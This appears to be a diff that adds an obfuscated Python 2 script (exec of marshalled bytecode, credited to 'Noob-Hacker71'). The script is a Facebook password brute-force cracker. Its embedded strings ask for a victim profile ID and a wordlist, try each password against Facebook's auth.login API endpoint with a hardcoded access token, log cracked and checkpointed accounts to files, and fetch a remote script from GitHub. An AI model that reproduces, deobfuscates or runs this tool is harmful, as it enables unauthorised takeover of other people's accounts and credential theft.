\\x00d-\\x00\\x17\\x83\\x01\\x00Z3\\x00e3\\x00Z4\\x00e\\x0c\\x00e\\x1e\\x00d.\\x00\\x17e5\\x00e4\\x00\\x83\\x01\\x00\\x17\\x83\\x01\\x00\\x01e6\\x00e3\\x00d\/\\x00\\x83\\x02\\x00j7\\x00\\x83\\x00\\x00Z8\\x00e6\\x00e4\\x00d\/\\x00\\x83\\x02\\x00\\x8f1\\x00Z9\\x00e:\\x00e9\\x00j7\\x00\\x83\\x00\\x00\\x83\\x01\\x00Z\\x1a\\x00e\\x0c\\x00e\\x1d\\x00d0\\x00\\x17e5\\x00e\\x1a\\x00\\x83\\x01\\x00\\x17\\x83\\x01\\x00\\x01Wd\\x01\\x00QXd1\\x00\\x84\\x00\\x00Z;\\x00e;\\x00\\x83\\x00\\x00\\x01d\\x01\\x00S(3\\x00\\x00\\x00i\\xff\\xff\\xff\\xffNs\\x15\\x00\\x00\\x00pip2 install requestss\\x15\\x00\\x00\\x00pkg install figlet -ys\\x16\\x00\\x00\\x00pip2 install mechanize(\\x01\\x00\\x00\\x00t\\n\\x00\\x00\\x00ThreadPool(\\x01\\x00\\x00\\x00t\\x07\\x00\\x00\\x00Browserc\\x01\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x03\\x00\\x00\\x00C\\x00\\x00\\x00s?\\x00\\x00\\x00x8\\x00|\\x00\\x00D]0\\x00}\\x01\\x00t\\x00\\x00j\\x01\\x00j\\x02\\x00|\\x01\\x00\\x83\\x01\\x00\\x01t\\x00\\x00j\\x01\\x00j\\x03\\x00\\x83\\x00\\x00\\x01t\\x04\\x00j\\x05\\x00d\\x01\\x00\\x83\\x01\\x00\\x01q\\x07\\x00Wd\\x00\\x00S(\\x02\\x00\\x00\\x00Ng\\x9a\\x99\\x99\\x99\\x99\\x99\\xa9?(\\x06\\x00\\x00\\x00t\\x03\\x00\\x00\\x00syst\\x06\\x00\\x00\\x00stdoutt\\x05\\x00\\x00\\x00writet\\x05\\x00\\x00\\x00flusht\\x04\\x00\\x00\\x00timet\\x05\\x00\\x00\\x00sleep(\\x02\\x00\\x00\\x00t\\x03\\x00\\x00\\x00argt\\x01\\x00\\x00\\x00i(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00t\\x00\\x00\\x00\\x00t\\x06\\x00\\x00\\x00motion\\x16\\x00\\x00\\x00s\\x08\\x00\\x00\\x00\\x00\\x01\\r\\x01\\x10\\x01\\r\\x01t\\x08\\x00\\x00\\x00max_timei\\x01\\x00\\x00\\x00s\\n\\x00\\x00\\x00user-agents\\x1e\\x01\\x00\\x00Dalvik\/1.6.0 (Linux; U; Android 4.4.2; NX55 Build\/KOT5506) [FBAN\/FB4A;FBAV\/106.0.0.26.68;FBBV\/45904160;FBDM\/{density=3.0,width=1080,height=1920};FBLC\/it_IT;FBRV\/45904160;FBCR\/PosteMobile;FBMF\/asus;FBBD\/asus;FBPN\/com.facebook.katana;FBDV\/ASUS_Z00AD;FBSV\/5.0;FBOP\/1;FBCA\/x86:armeabi-v7a;]t\\x05\\x00\\x00\\x00clears&\\x00\\x00\\x00\\x1b[1;33m\\nEverything is getting ready...i\\x03\\x00\\x00\\x00sJ\\x00\\x00\\x00https:\/\/raw.githubusercontent.com\/Noob-Hacker71\/Noob-Hacker71\/main\/info.pys\\x07\\x00\\x00\\x00\\x1b[1;30ms\\x07\\x00\\x00\\x00\\x1b[1;31ms\\x07\\x00\\x00\\x00\\x1b[1;32ms\\x07\\x00\\x00\\x00\\x1b[1;33ms\\x07\\x00\\x00\\x00\\x1b[1;34ms\\x07\\x00\\x00\\x00\\x1b[1;35ms\\x07\\x00\\x00\\x00\\x1b[1;36ms\\x07\\x00\\x00\\x00\\x1b[1;37ms\\x07\\x00\\x00\\x00\\x1b[1;94ms\\x07\\x00\\x00\\x00\\x1b[0;00ms\\xed\\x00\\x00\\x00\\n{ycl}[+] Attacking In Background For Fast Cracking ...\\n{bcl}[+] This A Facebook Password Cracker Script ...\\n{gcl}[+] Attack With Your Custom Wordlist ...\\n{rcl}[+] This Script From Noob-Hacker71 ...\\n{ccl}[+] Use It At Your Own Risk ...\\n\\nt\\x03\\x00\\x00\\x00bclt\\x03\\x00\\x00\\x00rclt\\x03\\x00\\x00\\x00gclt\\x03\\x00\\x00\\x00cclt\\x03\\x00\\x00\\x00ycls\\xd7\\x00\\x00\\x00{rcl}[+] {ycl}Connect A Fast Network For Better Experience..\\n{rcl}[+] {rcl}Don\\'t Use It For Any Illigele Puspose...\\n{rcl}[+] {gcl}For Stop Attack Press CTRL + \\\\ ...\\n--------------------------------------------------t\\x02\\x00\\x00\\x00Ons#\\x00\\x00\\x00You Need Noob-Hacker71\\'s Permissioni\\x02\\x00\\x00\\x00s\/\\x00\\x00\\x00xdg-open https:\/\/www.facebook.com\/ntahsan.nayems\\x1b\\x00\\x00\\x00figlet -f small Brute-Forces\\x13\\x00\\x00\\x00Enter Username =>> s\\x0e\\x00\\x00\\x00\\nCorrect User\\ns\\x13\\x00\\x00\\x00Enter Password =>> s\\x17\\x00\\x00\\x00\\nSuccessfully Logged Ins\\x0f\\x00\\x00\\x00\\nWrong Passwords\\x18\\x00\\x00\\x00\\nWrong User,,,Try Again\\ns\\x1c\\x00\\x00\\x00\\nEnter Victim Profile ID >> s\\x11\\x00\\x00\\x00Wordlist Path >> s\\x0e\\x00\\x00\\x00\\nWordlist =>> t\\x01\\x00\\x00\\x00rs\\x14\\x00\\x00\\x00\\nTotal Password =>> c\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x05\\x00\\x00\\x00C\\x00\\x00\\x00s\\xa7\\x00\\x00\\x00y\\x11\\x00t\\x00\\x00j\\x01\\x00d\\x01\\x00\\x83\\x01\\x00\\x01Wn\\x11\\x00\\x04t\\x02\\x00k\\n\\x00r$\\x00\\x01\\x01\\x01n\\x01\\x00Xy7\\x00x0\\x00t\\x03\\x00t\\x04\\x00d\\x02\\x00\\x83\\x02\\x00j\\x05\\x00\\x83\\x00\\x00D]\\x19\\x00}\\x00\\x00t\\x06\\x00j\\x07\\x00|\\x00\\x00j\\x08\\x00\\x83\\x00\\x00\\x83\\x01\\x00\\x01q>\\x00WWn\\x11\\x00\\x01\\x01\\x01t\\t\\x00d\\x03\\x00\\x83\\x01\\x00\\x01n\\x01\\x00Xd\\x04\\x00\\x84\\x00\\x00}\\x01\\x00y \\x00t\\n\\x00d\\x05\\x00\\x83\\x01\\x00}\\x02\\x00|\\x02\\x00j\\x0b\\x00|\\x01\\x00t\\x06\\x00\\x83\\x02\\x00\\x01Wn\\x07\\x00\\x01\\x01\\x01n\\x01\\x00Xd\\x00\\x00S(\\x06\\x00\\x00\\x00Nt\\x04\\x00\\x00\\x00saveR\\x14\\x00\\x00\\x00t\\x04\\x00\\x00\\x00Exitc\\x01\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x03\\x00\\x00\\x00S\\x00\\x00\\x00s\\xfe\\x00\\x00\\x00|\\x00\\x00}\\x01\\x00t\\x00\\x00j\\x01\\x00d\\x01\\x00t\\x02\\x00\\x17d\\x02\\x00\\x17|\\x01\\x00\\x17d\\x03\\x00\\x17\\x83\\x01\\x00}\\x02\\x00t\\x03\\x00j\\x04\\x00|\\x02\\x00\\x83\\x01\\x00}\\x03\\x00d\\x04\\x00|\\x03\\x00k\\x06\\x00r\\x93\\x00t\\x05\\x00t\\x06\\x00d\\x05\\x00\\x17t\\x02\\x00\\x17d\\x06\\x00\\x17|\\x01\\x00\\x17d\\x07\\x00\\x17\\x83\\x01\\x00\\x01t\\x01\\x00d\\x08\\x00d\\t\\x00\\x83\\x02\\x00}\\x04\\x00|\\x04\\x00j\\x07\\x00t\\x02\\x00d\\n\\x00\\x17|\\x01\\x00\\x17d\\x07\\x00\\x17\\x83\\x01\\x00\\x01|\\x04\\x00j\\x08\\x00\\x83\\x00\\x00\\x01ng\\x00d\\x0b\\x00|\\x03\\x00d\\x0c\\x00\\x19k\\x06\\x00r\\xfa\\x00t\\x05\\x00t\\t\\x00d\\r\\x00\\x17t\\x02\\x00\\x17d\\x06\\x00\\x17t\\t\\x00\\x17|\\x01\\x00\\x17d\\x07\\x00\\x17\\x83\\x01\\x00\\x01t\\x01\\x00d\\x0e\\x00d\\t\\x00\\x83\\x02\\x00}\\x05\\x00|\\x05\\x00j\\x07\\x00t\\x02\\x00d\\n\\x00\\x17|\\x01\\x00\\x17d\\x07\\x00\\x17\\x83\\x01\\x00\\x01|\\x05\\x00j\\x08\\x00\\x83\\x00\\x00\\x01n\\x00\\x00d\\x00\\x00S(\\x0f\\x00\\x00\\x00Ns\\x91\\x00\\x00\\x00https:\/\/b-api.facebook.com\/method\/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=s\\x17\\x00\\x00\\x00&locale=en_US&password=sH\\x00\\x00\\x00&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efmt\\x0c\\x00\\x00\\x00access_tokens\\x0b\\x00\\x00\\x00\\n[NOOB_OK] s\\x05\\x00\\x00\\x00  |  s\\x01\\x00\\x00\\x00\\ns\\x18\\x00\\x00\\x00save\/Noob_Successful.txtt\\x01\\x00\\x00\\x00as\\n\\x00\\x00\\x00 [ NOOB ] s\\x10\\x00\\x00\\x00www.facebook.comt\\t\\x00\\x00\\x00error_msgs\\x0b\\x00\\x00\\x00\\n[NOOB_CP] s\\x18\\x00\\x00\\x00save\/Noob_CheckPoint.txt(\\n\\x00\\x00\\x00t\\x02\\x00\\x00\\x00brt\\x04\\x00\\x00\\x00opent\\x06\\x00\\x00\\x00victimt\\x04\\x00\\x00\\x00jsont\\x04\\x00\\x00\\x00loadR\\x0b\\x00\\x00\\x00R\\x11\\x00\\x00\\x00R\\x04\\x00\\x00\\x00t\\x05\\x00\\x00\\x00closeR\\x12\\x00\\x00\\x00(\\x06\\x00\\x00\\x00R\\x08\\x00\\x00\\x00t\\x04\\x00\\x00\\x00linet\\x04\\x00\\x00\\x00datat\\x01\\x00\\x00\\x00qt\\x03\\x00\\x00\\x00okbt\\x03\\x00\\x00\\x00cps(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00R\\n\\x00\\x00\\x00t\\x04\\x00\\x00\\x00main\\x89\\x00\\x00\\x00s\\x1a\\x00\\x00\\x00\\x00\\x01\\x06\\x02\\x1f\\x01\\x0f\\x02\\x0c\\x01\\x1e\\x01\\x0f\\x01\\x19\\x01\\r\\x02\\x10\\x01\"\\x01\\x0f\\x01\\x19\\x01i\\x1e\\x00\\x00\\x00(\\x0c\\x00\\x00\\x00t\\x02\\x00\\x00\\x00ost\\x05\\x00\\x00\\x00mkdirt\\x07\\x00\\x00\\x00OSErrorR\\x1b\\x00\\x00\\x00t\\x03\\x00\\x00\\x00filt\\t\\x00\\x00\\x00readlinest\\x02\\x00\\x00\\x00idt\\x06\\x00\\x00\\x00appendt\\x05\\x00\\x00\\x00stript\\x04\\x00\\x00\\x00exitR\\x00\\x00\\x00\\x00t\\x03\\x00\\x00\\x00map(\\x03\\x00\\x00\\x00R\\t\\x00\\x00\\x00R%\\x00\\x00\\x00t\\x01\\x00\\x00\\x00p(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00R\\n\\x00\\x00\\x00t\\x04\\x00\\x00\\x00Noob~\\x00\\x00\\x00s\\x1e\\x00\\x00\\x00\\x00\\x01\\x03\\x01\\x11\\x01\\r\\x01\\x04\\x01\\x03\\x01\\x1c\\x01\\x1b\\x01\\x03\\x01\\x0e\\x02\\t\\x13\\x03\\x01\\x0c\\x01\\x14\\x01\\x03\\x01(\\x02\\x00\\x00\\x00s\\n\\x00\\x00\\x00user-agents\\x1e\\x01\\x00\\x00Dalvik\/1.6.0 (Linux; U; Android 4.4.2; NX55 Build\/KOT5506) [FBAN\/FB4A;FBAV\/106.0.0.26.68;FBBV\/45904160;FBDM\/{density=3.0,width=1080,height=1920};FBLC\/it_IT;FBRV\/45904160;FBCR\/PosteMobile;FBMF\/asus;FBBD\/asus;FBPN\/com.facebook.katana;FBDV\/ASUS_Z00AD;FBSV\/5.0;FBOP\/1;FBCA\/x86:armeabi-v7a;](<\\x00\\x00\\x00R&\\x00\\x00\\x00R\\x02\\x00\\x00\\x00R\\x06\\x00\\x00\\x00t\\x06\\x00\\x00\\x00randomR\\x1d\\x00\\x00\\x00t\\x08\\x00\\x00\\x00requestst\\x0b\\x00\\x00\\x00ImportErrort\\x06\\x00\\x00\\x00systemt\\t\\x00\\x00\\x00mechanizet\\x14\\x00\\x00\\x00multiprocessing.poolR\\x00\\x00\\x00\\x00R\\x01\\x00\\x00\\x00R\\x0b\\x00\\x00\\x00R\\x1a\\x00\\x00\\x00t\\x11\\x00\\x00\\x00set_handle_robotst\\x05\\x00\\x00\\x00Falset\\x12\\x00\\x00\\x00set_handle_refresht\\x05\\x00\\x00\\x00_httpt\\x14\\x00\\x00\\x00HTTPRefreshProcessort\\n\\x00\\x00\\x00addheadersR\\x07\\x00\\x00\\x00t\\x07\\x00\\x00\\x00sessiont\\x02\\x00\\x00\\x00rst\\x03\\x00\\x00\\x00gett\\x02\\x00\\x00\\x00rgt\\x04\\x00\\x00\\x00textt\\x01\\x00\\x00\\x00xR+\\x00\\x00\\x00t\\x03\\x00\\x00\\x00aclR\\x0f\\x00\\x00\\x00R\\x10\\x00\\x00\\x00R\\x12\\x00\\x00\\x00R\\x0e\\x00\\x00\\x00t\\x03\\x00\\x00\\x00pclR\\x11\\x00\\x00\\x00t\\x03\\x00\\x00\\x00wclt\\x03\\x00\\x00\\x00mclt\\x03\\x00\\x00\\x00nclt\\x06\\x00\\x00\\x00formatt\\x04\\x00\\x00\\x00warnt\\x04\\x00\\x00\\x00infot\\n\\x00\\x00\\x00PermissionR.\\x00\\x00\\x00t\\x04\\x00\\x00\\x00Truet\\t\\x00\\x00\\x00raw_inputt\\x03\\x00\\x00\\x00Usrt\\x04\\x00\\x00\\x00Usert\\x03\\x00\\x00\\x00psdt\\x03\\x00\\x00\\x00Pwdt\\x04\\x00\\x00\\x00logoR\\x1c\\x00\\x00\\x00t\\x08\\x00\\x00\\x00passlistR)\\x00\\x00\\x00t\\x03\\x00\\x00\\x00strR\\x1b\\x00\\x00\\x00R*\\x00\\x00\\x00t\\x04\\x00\\x00\\x00wordt\\x04\\x00\\x00\\x00filet\\x03\\x00\\x00\\x00lenR1\\x00\\x00\\x00(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00R\\n\\x00\\x00\\x00t\\x08\\x00\\x00\\x00<module>\\x05\\x00\\x00\\x00s\\xa0\\x00\\x00\\x00<\\x02\\x03\\x01\\x10\\x01\\r\\x01\\x11\\x01\\r\\x02\\x03\\x01\\x10\\x01\\r\\x01\\r\\x01\\x10\\x02\\x10\\x01\\x10\\x02\\t\\x07\\x0c\\x01\\r\\x01\\x1c\\x01\\x0c\\x03\\r\\x02\\n\\x01\\r\\x01\\r\\x01\\x0c\\x01\\t\\x01\\x0f\\x01\\x08\\x06\\x06\\x04\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x01\\x06\\x07*\\x04$\\x02\\x0c\\x01\\x03\\x02\\x0e\\x01\\r\\x01\\r\\x01\\x07\\x02\\t\\x01\\r\\x01\\n\\x01\\x10\\x01\\x0c\\x01\\x0e\\x01\\x10\\x01\\x0c\\x01\\x0e\\x01\\x04\\x02\\x0e\\x01\\x10\\x02\\x0e\\x01\\x11\\x02\\r\\x01\\x05\\x01\\n\\x01\\x10\\x01\\x10\\x01\\x06\\x01\\x18\\x01\\x15\\x02\\x12\\x01\\x12\\x01\\x1e\\x06\\t%(\\x02\\x00\\x00\\x00t\\x07\\x00\\x00\\x00marshalt\\x05\\x00\\x00\\x00loads(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00t\\x00\\x00\\x00\\x00t\\x08\\x00\\x00\\x00<module>\\x01\\x00\\x00\\x00s\\x02\\x00\\x00\\x00\\x0c\\x02(\\x02\\x00\\x00\\x00t\\x07\\x00\\x00\\x00marshalt\\x05\\x00\\x00\\x00loads(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00t\\x00\\x00\\x00\\x00t\\x08\\x00\\x00\\x00<module>\\x01\\x00\\x00\\x00s\\x02\\x00\\x00\\x00\\x0c\\x02'))\n\\ No newline at end of file\n+#Compylied By Noob-Hacker71 \n+exec(marshal.loads('c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00@\\x00\\x00\\x00s!\\x00\\x00\\x00d\\x00\\x00d\\x01\\x00l\\x00\\x00Z\\x00\\x00e\\x00\\x00j\\x01\\x00d\\x02\\x00\\x83\\x01\\x00d\\x01\\x00\\x04Ud\\x01\\x00S(\\x03\\x00\\x00\\x00i\\xff\\xff\\xff\\xffNs\\x0e\\x15\\x00\\x00c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00@\\x00\\x00\\x00s!\\x00\\x00\\x00d\\x00\\x00d\\x01\\x00l\\x00\\x00Z\\x00\\x00e\\x00\\x00j\\x01\\x00d\\x02\\x00\\x83\\x01\\x00d\\x01\\x00\\x04Ud\\x01\\x00S(\\x03\\x00\\x00\\x00i\\xff\\xff\\xff\\xffNs\\x80\\x14\\x00\\x00c\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x0b\\x00\\x00\\x00@\\x00\\x00\\x00s\\xfc\\x03\\x00\\x00d\\x00\\x00d\\x01\\x00l\\x00\\x00Z\\x00\\x00d\\x00\\x00d\\x01\\x00l\\x01\\x00Z\\x01\\x00d\\x00\\x00d\\x01\\x00l\\x02\\x00Z\\x02\\x00d\\x00\\x00d\\x01\\x00l\\x03\\x00Z\\x03\\x00d\\x00\\x00d\\x01\\x00l\\x04\\x00Z\\x04\\x00y\\x10\\x00d\\x00\\x00d\\x01\\x00l\\x05\\x00Z\\x05\\x00Wn\\x1e\\x00\\x04e\\x06\\x00k\\n\\x00rl\\x00\\x01\\x01\\x01e\\x00\\x00j\\x07\\x00d\\x02\\x00\\x83\\x01\\x00\\x01n\\x01\\x00Xe\\x00\\x00j\\x07\\x00d\\x03\\x00\\x83\\x01\\x00\\x01y\\x10\\x00d\\x00\\x00d\\x01\\x00l\\x08\\x00Z\\x08\\x00Wn*\\x00\\x04e\\x06\\x00k\\n\\x00r\\xb6\\x00\\x01\\x01\\x01e\\x00\\x00j\\x07\\x00d\\x04\\x00\\x83\\x01\\x00\\x01d\\x00\\x00d\\x01\\x00l\\x08\\x00Z\\x08\\x00n\\x01\\x00Xd\\x00\\x00d\\x05\\x00l\\t\\x00m\\n\\x00Z\\n\\x00\\x01d\\x00\\x00d\\x06\\x00l\\x08\\x00m\\x0b\\x00Z\\x0b\\x00\\x01d\\x07\\x00\\x84\\x00\\x00Z\\x0c\\x00e\\x08\\x00j\\x0b\\x00\\x83\\x00\\x00Z\\r\\x00e\\r\\x00j\\x0e\\x00e\\x0f\\x00\\x83\\x01\\x00\\x01e\\r\\x00j\\x10\\x00e\\x08\\x00j\\x11\\x00j\\x12\\x00\\x83\\x00\\x00d\\x08\\x00d\\t\\x00\\x83\\x01\\x01\\x01d2\\x00g\\x01\\x00e\\r\\x00_\\x13\\x00e\\x00\\x00j\\x07\\x00d\\x0c\\x00\\x83\\x01\\x00\\x01e\\x0c\\x00d\\r\\x00\\x83\\x01\\x00\\x01e\\x02\\x00j\\x14\\x00d\\x0e\\x00\\x83\\x01\\x00\\x01e\\x00\\x00j\\x07\\x00d\\x0c\\x00\\x83\\x01\\x00\\x01e\\x05\\x00j\\x15\\x00\\x83\\x00\\x00Z\\x16\\x00e\\x16\\x00j\\x17\\x00Z\\x18\\x00e\\x18\\x00d\\x0f\\x00\\x83\\x01\\x00j\\x19\\x00Z\\x1a\\x00e\\x1a\\x00d\\x01\\x00\\x04Ug\\x00\\x00Z\\x1b\\x00d\\x10\\x00Z\\x1c\\x00d\\x11\\x00Z\\x1d\\x00d\\x12\\x00Z\\x1e\\x00d\\x13\\x00Z\\x1f\\x00d\\x14\\x00Z \\x00d\\x15\\x00Z!\\x00d\\x16\\x00Z\"\\x00d\\x17\\x00Z#\\x00d\\x18\\x00Z$\\x00d\\x19\\x00Z%\\x00d\\x11\\x00Z\\x1d\\x00d\\x12\\x00Z\\x1e\\x00d\\x13\\x00Z\\x1f\\x00d\\x14\\x00Z \\x00d\\x15\\x00Z!\\x00d\\x16\\x00Z\"\\x00d\\x17\\x00Z#\\x00d\\x18\\x00Z$\\x00d\\x19\\x00Z%\\x00d\\x1a\\x00j&\\x00d\\x1b\\x00e \\x00d\\x1c\\x00e\\x1d\\x00d\\x1d\\x00e\\x1e\\x00d\\x1e\\x00e\"\\x00d\\x1f\\x00e\\x1f\\x00\\x83\\x00\\x05Z\\'\\x00d \\x00j&\\x00d\\x1c\\x00e\\x1d\\x00d\\x1f\\x00e\\x1f\\x00d\\x1d\\x00e\\x1e\\x00d\\x1e\\x00e\"\\x00\\x83\\x00\\x04Z(\\x00e)\\x00d!\\x00k\\x02\\x00rS\\x02n\/\\x00e\\x0c\\x00e\"\\x00d\"\\x00\\x17\\x83\\x01\\x00\\x01e\\x02\\x00j\\x14\\x00d#\\x00\\x83\\x01\\x00\\x01e\\x00\\x00j\\x07\\x00d$\\x00\\x83\\x01\\x00\\x01e*\\x00\\x83\\x00\\x00\\x01x\\xb2\\x00e+\\x00r6\\x03e\\x00\\x00j\\x07\\x00d%\\x00\\x83\\x01\\x00\\x01e\\x0c\\x00e\\'\\x00\\x83\\x01\\x00\\x01e,\\x00e \\x00d&\\x00\\x17\\x83\\x01\\x00Z-\\x00e-\\x00e.\\x00k\\x02\\x00r\\x18\\x03e\\x0c\\x00e\\x1e\\x00d\\'\\x00\\x17\\x83\\x01\\x00\\x01e,\\x00e\\x1f\\x00d(\\x00\\x17\\x83\\x01\\x00Z\/\\x00e\/\\x00e0\\x00k\\x02\\x00r\\xfa\\x02e\\x0c\\x00e\\x1e\\x00d)\\x00\\x17\\x83\\x01\\x00\\x01Pq3\\x03e\\x0c\\x00e\\x1d\\x00d*\\x00\\x17\\x83\\x01\\x00\\x01e\\x00\\x00j\\x07\\x00d\\x0c\\x00\\x83\\x01\\x00\\x01q\\x85\\x02e\\x0c\\x00e\\x1d\\x00d+\\x00\\x17\\x83\\x01\\x00\\x01e\\x00\\x00j\\x07\\x00d\\x0c\\x00\\x83\\x01\\x00\\x01q\\x85\\x02We\\x00\\x00j\\x07\\x00d\\x0c\\x00\\x83\\x01\\x00\\x01e1\\x00GHe\\x0c\\x00e(\\x00\\x83\\x01\\x00\\x01e,\\x00e\"\\x00d,\\x00\\x17\\x83\\x01\\x00Z2\\x00e,\\x00e \\x00d-\\x00\\x17\\x83\\x01\\x00Z3\\x00e3\\x00Z4\\x00e\\x0c\\x00e\\x1e\\x00d.\\x00\\x17e5\\x00e4\\x00\\x83\\x01\\x00\\x17\\x83\\x01\\x00\\x01e6\\x00e3\\x00d\/\\x00\\x83\\x02\\x00j7\\x00\\x83\\x00\\x00Z8\\x00e6\\x00e4\\x00d\/\\x00\\x83\\x02\\x00\\x8f1\\x00Z9\\x00e:\\x00e9\\x00j7\\x00\\x83\\x00\\x00\\x83\\x01\\x00Z\\x1a\\x00e\\x0c\\x00e\\x1d\\x00d0\\x00\\x17e5\\x00e\\x1a\\x00\\x83\\x01\\x00\\x17\\x83\\x01\\x00\\x01Wd\\x01\\x00QXd1\\x00\\x84\\x00\\x00Z;\\x00e;\\x00\\x83\\x00\\x00\\x01d\\x01\\x00S(3\\x00\\x00\\x00i\\xff\\xff\\xff\\xffNs\\x15\\x00\\x00\\x00pip2 install requestss\\x15\\x00\\x00\\x00pkg install figlet -ys\\x16\\x00\\x00\\x00pip2 install mechanize(\\x01\\x00\\x00\\x00t\\n\\x00\\x00\\x00ThreadPool(\\x01\\x00\\x00\\x00t\\x07\\x00\\x00\\x00Browserc\\x01\\x00\\x00\\x00\\x02\\x00\\x00\\x00\\x03\\x00\\x00\\x00C\\x00\\x00\\x00s?\\x00\\x00\\x00x8\\x00|\\x00\\x00D]0\\x00}\\x01\\x00t\\x00\\x00j\\x01\\x00j\\x02\\x00|\\x01\\x00\\x83\\x01\\x00\\x01t\\x00\\x00j\\x01\\x00j\\x03\\x00\\x83\\x00\\x00\\x01t\\x04\\x00j\\x05\\x00d\\x01\\x00\\x83\\x01\\x00\\x01q\\x07\\x00Wd\\x00\\x00S(\\x02\\x00\\x00\\x00Ng\\x9a\\x99\\x99\\x99\\x99\\x99\\xa9?(\\x06\\x00\\x00\\x00t\\x03\\x00\\x00\\x00syst\\x06\\x00\\x00\\x00stdoutt\\x05\\x00\\x00\\x00writet\\x05\\x00\\x00\\x00flusht\\x04\\x00\\x00\\x00timet\\x05\\x00\\x00\\x00sleep(\\x02\\x00\\x00\\x00t\\x03\\x00\\x00\\x00argt\\x01\\x00\\x00\\x00i(\\x00\\x00\\x00\\x00(\\x00\\x00\\x00\\x00t\\x00\\x00\\x00\\x00t\\x06\\x00\\x00\\x00motion\\x16\\x00\\x00\\x00s\\x08\\x00\\x00\\x00\\x00\\x01\\r\\x01\\x10\\x01\\r\\x01t\\x08\\x00\\x00\\x00max_timei\\x01\\x00\\x00\\x00s\\n\\x00\\x00\\x00user-agents\\x1e\\x01\\x00\\x00Dalvik\/1.6.0 (Linux; U; Android 4.4.2; NX55 Build\/KOT5506) [FBAN\/FB4A;FBAV\/106.0.0.26.68;FBBV\/45904160;FBDM\/{density=3.0,width=1080,height=1920};FBLC\/it_IT;FBRV\/45904160;FBCR\/PosteMobile;FBMF\/asus;FBBD\/asus;FBPN\/com.facebook.katana;FBDV\/ASUS_Z00AD;FBSV\/5.0;FBOP\/1;FBCA\/x86:armeabi-v7a;]t\\x05\\x00\\x00\\x00clears&\\x00\\x00\\x00\\x1b[1;33m\\nEverything is getting ready...i\\x03\\x00\\x00\\x00sJ\\x00\\x00\\x00https:\/\/raw.githubusercontent.com\/Noob-Hacker71\/Noob-Hacker71\/main\/info.pys\\x07\\x00\\x00\\x00\\x1b[1;30ms\\x07\\x00\\x00\\x00\\x1b[1;31ms\\x07\\x00\\x00\\x00\\x1b[1;32ms\\x07\\x00\\x00\\x00\\x1b[1;33ms\\x07\\x00\\x00\\x00\\x1b[1;34ms\\x07\\x00\\x00\\x00\\x1b[1;35ms\\x07\\x00\\x00\\x00\\x1b[1;36ms\\x07\\x00\\x00\\x00\\x1b[1;37ms\\x07\\x00\\x00\\x00\\x1b[1;94ms\\x07\\x00\\x00\\x00\\x1b[0;00ms\\xed\\x00\\x00\\x00\\n{ycl}[+] Attacking In Background For Fast Cracking ...\\n{bcl}[+] This A Facebook Password Cracker Script ...\\n{gcl}[+] Attack With Your Custom Wordlist ...\\n{rcl}[+] This Script From Noob-Hacker71 ...\\n{ccl}[+] Use It At Your Own Risk ...\\n\\nt\\x03\\x00\\x00\\x00bclt\\x03\\x00\\x00\\x00rclt\\x03\\x00\\x00\\x00gclt\\x03\\x00\\x00\\x00cclt\\x03\\x00\\x00\\x00ycls\\xd7\\x00\\x00\\x00{rcl}[+] {ycl}Connect A Fast Network For Better Experience..\\n{rcl}[+] {rcl}Don\\'t Use It For Any Illigele Puspose...\\n{rcl}[+] {gcl}For Stop Attack Press CTRL + \\\\ ...\\n--------------------------------------------------t\\x02\\x00\\x00\\x00Ons#\\x00\\x00\\x00You Need Noob-Hacker71\\'s Permissioni\\x02\\x00\\x00\\x00s\/\\x00\\x00\\x00xdg-open https:\/\/www.facebook.com\/ntahsan.nayems\\x1b\\x00\\x00\\x00figlet -f small Brute-Forces\\x13\\x00\\x00\\x00Enter Username =>> s\\x0e\\x00\\x00\\x00\\nCorrect User\\ns\\x13\\x00\\x00\\x00Enter Password =>> s\\x17\\x00\\x00\\x00\\nSuccessfully Logged Ins\\x0f\\x00\\x00\\x00\\nWrong Passwords\\x18\\x00\\x00\\x00\\nWrong User,,,Try Again\\ns\\x1c\\x00\\x00\\x00\\nEnter Victim Profile ID >> s\\x11\\x00\\x00\\x00Wordlist Path >> s\\x0e\\x00\\x00\\x00\\nWordlist =>> t\\x01\\x00\\x00\\x00rs\\x14\\x00\\x00\\x00\\nTotal Password =>> c\\x00\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x05\\x00\\x00\\x00C\\x00\\x00\\x00s\\xa7\\x00\\x00\\x00y\\x11\\x00t\\x00\\x00j\\x01\\x00d\\x01\\x00\\x83\\x01\\x00\\x01Wn\\x11\\x00\\x04t\\x02\\x00k\\n\\x00r$\\x00\\x01\\x01\\x01n\\x01\\x00Xy7\\x00x0\\x00t\\x03\\x00t\\x04\\x00d\\x02\\x00\\x83\\x02\\x00j\\x05\\x00\\x83\\x00\\x00D]\\x19\\x00}\\x00\\x00t\\x06\\x00j\\x07\\x00|\\x00\\x00j\\x08\\x00\\x83\\x00\\x00\\x83\\x01\\x00\\x01q>\\x00WWn\\x11\\x00\\x01\\x01\\x01t\\t\\x00d\\x03\\x00\\x83\\x01\\x00\\x01n\\x01\\x00Xd\\x04\\x00\\x84\\x00\\x00}\\x01\\x00y 